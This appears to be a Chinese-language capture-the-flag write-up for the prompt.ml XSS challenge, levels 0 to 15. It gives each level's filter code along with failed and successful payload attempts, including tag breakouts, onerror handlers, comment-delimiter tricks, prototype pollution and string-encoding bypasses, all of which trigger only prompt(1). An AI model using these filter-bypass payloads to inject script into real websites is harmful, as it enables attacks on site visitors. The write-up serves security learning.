# [Prompt.ml](https://prompt.ml) 实验 writeup

## 0
```js
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}      
```

注入点在于input标签内的value属性，即`'<input type="text" value="' + input + '">'`

所以注入：`"><script>prompt(1)</script>`.

## 1
过滤函数为：
```js
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}    
```
js中的正则表达式有两种形式：
- 使用一个正则表达式字面量，其由包含在斜杠之间的模式组成 ，例如：`var re = /ab+c/;`；
- 或者调用RegExp对象的构造函数,例如：`var re = new RegExp("ab+c");` 

上面的正则表达式，将 <...> 和</...> 不区分大消息全被过滤为空字符。显然需要可以使用html实体编码来绕过。

html实体编码：
- `&lt;` 或 `&#60;` 表示 < ；
- `&gt;`	`&#62;` 表示 >	大于号

尝试注入：`&#60;script&#62;prompt(1)&#60;/script&#62;` 不成。
尝试注入：`<img src="1" onerror="prompt(1)"`，成功。
尝试注入：`<body onload="prompt(1)"\\`，成功

## 2
```js
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}    
```

正则是替换了 = 和 ( 为空字符。

`&lpar;`表示（

不成功的尝试：
```
<script>prompt`1`</script>
&lt;script&gt;prompt&#40;1&#41;&lt;/script&gt;
<svg onload&#61;prompt`1`>
<body onload&#61;prompt`1`>
<img src=1 onerror&#61;prompt`1`>

```
但有趣的是注入下列语句能弹出alert：

```
<script>alert`1`</script>
```
尝试下列成功:
```
<svg><script>prompt&#40;1)</script>
<svg><script>prompt&#x28;1);</script>
<script>eval.call`${'prompt\x281)'}`</script>
```

## 3 
```js
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}
```

过滤函数将 - ， >转为_ ,并将输入内容全部置入注释中。

尝试失败的payload：
```
--&gt;<svg><script>prompt(1)</script><!--
\x2d\x2d\x3E<body onload="prompt(1)"><!--1
-&#x2D;><script>eval.call`${'prompt\x281)'}`</script><!--1
&#x2d;&#x2d;&#x3E;<script>eval("prompt(1)");</script><!--1
```

尝试下列成功：
```
--!><script>eval("prompt(1)");</script><!--1
1--!><img src=1 onerror="prompt(1)"><!--12
--!><svg><script>prompt(1);</script>
```

看来注释的封闭只需要两个`--`，而不是强制要求`-->`

## 4
```js
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}       
```

decodeURIComponent() 函数可对 encodeURIComponent() 函数编码的 URI 进行解码。
  

尝试下列payload 失败：
```
http://prompt.ml/js/test.js%22><script>prompt(1);</script>%22


http%3A%2F%2Fprompt.ml%2Fjs%2Ftest.js%22%3E%3Cscript%3Eprompt(1)%3C%2Fscrip%3E


http://prompt.ml%2f@github.com/xxx/blob/master/courses/webtestguide/labs/prompt.js


<script src="https://github.com/xxx.github.io/tree/master/projects/atest/prompt.js"></script>
```

这个题还没做出来，可能需要一个公网可访问的网站，访问prompt.js

## 5

题目：
```js
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}      
```

正则式转义了 `> onxx focus`等为 _。

尝试失败的例子：
```
k"&#x3e;<iframe src="javascript:prompt(1)"&#x3e;<img a=" 
k"&#x3e;<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCg3KTwvc2NyaXB0Pg"&#x3e;<img a=" 
```

看了别人的writeup，html input 标签的type类型可以有：`button checkbox file hidden image password radio reset submit text`
通过覆盖type 和 换行来解决过滤。

尝试下列payload成功：
```
" type="image" src onerror=
(prompt(1))
```
注意：`<img>` 标签有两个必需的属性：src 属性 和 alt 属性。不写src是不行的。

## 6

```
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
            <script>                                                  \n\
                // forbid javascript: or vbscript: and data: stuff    \n\
                if (!/script:|data:/i.test(document.forms[0].action)) \n\
                    document.forms[0].submit();                       \n\
                else                                                  \n\
                    document.write("Action forbidden.")               \n\
            </script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}        
```

这里考察了一个有趣的知识点。如果有下列2个文档：

```html
<!--html1-->
<!DOCTYPE html>
<html>
    <body>
        <form action="www.baidu.com" method="POST">
            <input name="action" value="123">

        </form>
    </body>
</html>
```

```html
<!--html2-->
<!DOCTYPE html>
<html>
    <body>
        <form action="www.baidu.com" method="POST">
            <input name="xxxx" value="123">

        </form>
    </body>
</html>
```

那么html1 `document.form[0].action` 的值是`<input name="action" value="123">`;

而html2 `document.form[0].action` 的值是 www.baidu.com。

概况起来，即
- document对象会首先查询name或id为action的节点；
- 如果没有才会查询返回当前节点的属性action；
- 如果没有id或name为action，且本节点没有action属性，则返回window.location.href。

这个知识点一旦了解，那么payload即可构造出来：`javascript:prompt(1)#{"action":"Matt"}`

## 7
题目：
```
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}  
```    

尝试输入 : dog#cat#bird#mouse
得到输出：
```html
<p class="comment" title="dog"></p>
<p class="comment" title="cat"></p>
<p class="comment" title="bird"></p>
<p class="comment" title="mouse"></p>
```
可以想到的办法是加注释符，把中间的忽略掉，难点在于长度限制。

一开始我尝试了`<!-- -->`这个仍不满足要求，查资料发现有这样的payload `<script/src=//⑭.₨>` 或 `<script src=//₨₨.pw>` 虽然对解本题无用。后来想到script中注释符可用`/* */`,那么payload可以构成为：`"><script>/*#*/prompt(1/*#*/)</script>#`，解决。


## 8
题目：
```
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
}   
```
这里显然过滤了\r \n < /等字符，所以



&quot;&#92;&#114;&#92;&#110;prompt(1);&#60;&#47;script>&#92;&#114;&#92;&#110;&quot;

`\u2028prompt(1)\u2028`


## 9
```js
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}        
```
这个过滤将标签`<abc` 变为 `<_abc`

这里有几个问题：
- 需要绕过<_过滤
- 不能使prompt(1)为大写，大写后浏览器不认识；
- 使用html实体编码`&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;`，虽然可以绕过上述过滤，得到`<script>prompt(1)</script>`，但是无法执行。我理解是浏览器仅解析一次实体，对于已经过一次解析得到的`<script>prompt(1)</script>`不再视其为脚本，而将其视为普通文本。

这里要用到一个知识：`toUpperCase();`不仅仅转换字符为大写，还会转换unicode码为大写字符，所以在`<`后加一个可转变为`S`的unicode码，这个字符是拉丁文小写字母长 S 即'ſ'.toUpperCase()结果为‘S’，这种奇技淫巧只能是积累了。

希腊字母、罗马字母、拉丁字母、英文字母...从文字历史上有传承关系。

然后就是构造一个`<ſcript  ſrc="http://10.10.10.134/mywebsite/1.js"></ſcript>`，这个payload转换为大写后，仍然全是html，理论上可以使用。但我并未成功过关。


## 10 

题目：
```html
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}      
```
encodeURIComponent()函数使用将一个、两个、三个或四个字节表示字符的UTF-8编码的转义序列，来替换某些字符的每个实例来编码。decodeURIComponent() 函数可对 encodeURIComponent() 函数编码的 URI 进行解码。

- 该方法不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： `- _ . ! ~ * ' ( ) `。

- 其他字符（比如` ：;/?:@&=+$,# `这些用于分隔 URI 组件的标点符号），都是由一个或多个十六进制的转义序列替换的。

上面的代码还将prompt转换为alert，将'转换掉，那么利用这一点可以构造`promp't(1)`。

## 11
```html
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}        
```

这个函数会对特殊字符`[ | * / \ < > & ^ : ; = ~ ! % -`转换掉。然后放到一个json串中，然后输出，其中有输入的数据。

js解析是从右向左的，所以字典中若有同名键，则返回最右侧的，例如：
```js
var data = {"action":"login","message":"Welcome","message":"hehe"}
data.message
```
返回：hehe。

根据上面escape函数，如果能`","message": "prompt(1)`应该会有结果，但现在很多符号被转义了，无奈作罢。总之不能写标签，不能有冒号等等。

换个思路，双引号没有被转义，先写在最前面，用来闭合前面的字符串。`"`；最后面也需要一个`"`，闭合后面`."`。中间写 `prompt(1)`，即`"prompt(1)"`，但这样不行，需要利用一个奇怪的js特性：`(prompt(1)) instanceof "1"` 或 `(prompt(1)) in "1"` 会弹出窗口，所以payload为：`"(prompt(1)) instanceof "1`

## 12

```js
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}    
```
escape转义了URI、过滤了单引号，还将prompt换成了alert。

这里又是一个特殊用法，把字符串'prompt'转换为整数，避免过滤，然后再把它转回来使用。

```js
parseInt("prompt",32)
867982141

(867982141).toString(32)
"prompt"

eval((867982141).toString(32))(1)
```
这里注意，eval将字符串转为函数调用，参数可以放在外面。

例如：`eval("parseInt(\"prompt\",32)")` 和`eval("parseInt")("prompt",32)`是一样的。


## 13
```js

function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}       
```

分析：输入应当是json格式的，只允许输入：`英文字母、数字 / . `; 将字符串中双引号去掉；插入模板中。


JS 每个对象都会在其内部初始化一个属性，就是proto，当我们访问对象的属性时，如果对象内部不存在这个属性，那么就会去proto里面找这个属性。
举例测试：
```js
b={"a":1,"__proto__":{"a":2}}
//{a: 1}
b.a
//1
delete b.a
//true
b.a
//2
```

那么就是在`{"source":"http://sandbox.prompt.ml/PROMPT.JPG"}`基础上构造`{"source":"http://sandbox.prompt.ml/PROMPT.JPG","__proto__":{"source":"prompt(1)"}}`

尝试：`{"source":"*","__proto__":{"source":"1" onerror='prompt(1)'"}}`，其中1后面的的双引号本意是闭合属性`src="1" `被用作分割符，所以不能使用。

那么使用单引号：`{"source":"*","__proto__":{"source":"1' onerror='prompt(1)'"}}`即下面代码执行后

```html

'<img src="{{source}}">'.replace('{{source}}', "1' onerror='prompt(1)'")
"<img src="1' onerror='prompt(1)'">"
```
结果为：能够输出：`<img src="1' onerror='prompt(1)'">`

而使用replace特殊符号 **$`**

```
'<img src="{{source}}">'.replace('{{source}}', "$`1' onerror='prompt(1)'")
"<img src="1' onerror='prompt(1)'">"
```

结果为：能够输出标签：`<img src="<img src="1' onerror='prompt(1)'">`，即在正则式匹配位置处，先将原字符串左侧已有部分再输出一遍，然后匹配部分替换为新内容，后续内容不变。这样src属性被有效闭合，而img标签又发生错误，所以会调用prompt(1)

这里的$`使用又例如：

```
"1111123333".replace('2','$`xss')
``` 
结果为："1111111111xss3333"

payload：
```
{"source":"*","__proto__":{"source":"$`1' onerror='prompt(1)'"}}
```

## 14

```js
function escape(input) {
    // I expect this one will have other solutions, so be creative :)
    // mspaint makes all file names in all-caps :(
    // too lazy to convert them back in lower case
    // sample input: prompt.jpg => PROMPT.JPG
    input = input.toUpperCase();
    // only allows images loaded from own host or data URI scheme
    input = input.replace(/\/\/|\w+:/g, 'data:');
    // miscellaneous filtering
    input = input.replace(/[\\&+%\s]|vbs/gi, '_');

    return '<img src="' + input + '">';
}        
```

上面代码：先把输入变为大写，过滤`// 字符 : `为data:， 过滤 `\ & + % \s vbs` 为 _ 。

分析：
- 由于js大小写敏感，所以只能引用外部脚；
- data:是？？查资料了解到 Data URI是由RFC 2397定义的一种把小文件直接嵌入文档的方案。格式如下：`data:[<MIME type>][;charset=<charset>][;base64],<encoded data>`
其实整体可以视为三部分，即声明：参数+数据，逗号左边的是各种参数，右边的是数据。

MIME type，表示数据呈现的格式，即指定嵌入数据的MIME。
- 对于PNG的图片，其格式是image/png，如果没有指定，默认是text/plain。
- character set(字符集）大多数被忽略，默认是charset=US-ASCII。如果指定是的数据格式是图片时，字符集将不再使用。
- base64，这一部分将表明其数据的编码方式，此处为声明后面的数据的编码是base64，我们可以不必使用base64编码格式，如果那样，我们将使用标准的URL编码方式,形如%XX%XX%XX的格式。

没做出来。

## 15
```js
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}  
``

过滤了`\ *`,按`#`分片，title限制长度为15字符，

`"><svg><!--#--><script><!--#-->prompt(1<!---#-->)</script><`